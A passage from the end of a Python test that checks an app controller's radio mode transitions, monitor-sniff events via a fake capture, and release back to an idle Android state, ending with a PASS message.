    assert "monitor_smelling" in mon_events and "monitor_done" in mon_events, mon_events
    assert _FakeCapture.started, "monitor sniff (FinderAir) must have started"
    ctl._emit = _prev_emit

    # 8) release -> IDLE, radio handed back
    ctl.release()
    assert ctl.mode == Mode.IDLE and ctl.radio.state == CardState.ANDROID
    assert ctl.airspaces_list == []

    kinds = [k for k, _ in events]
    assert "detected" in kinds and "smelling" in kinds and "mode" in kinds
    ctl.arbiter.close()
    print("modes seen:", [d.get("mode") for k, d in events if k == "mode"])
    print("AppController (associate-first) PASS")
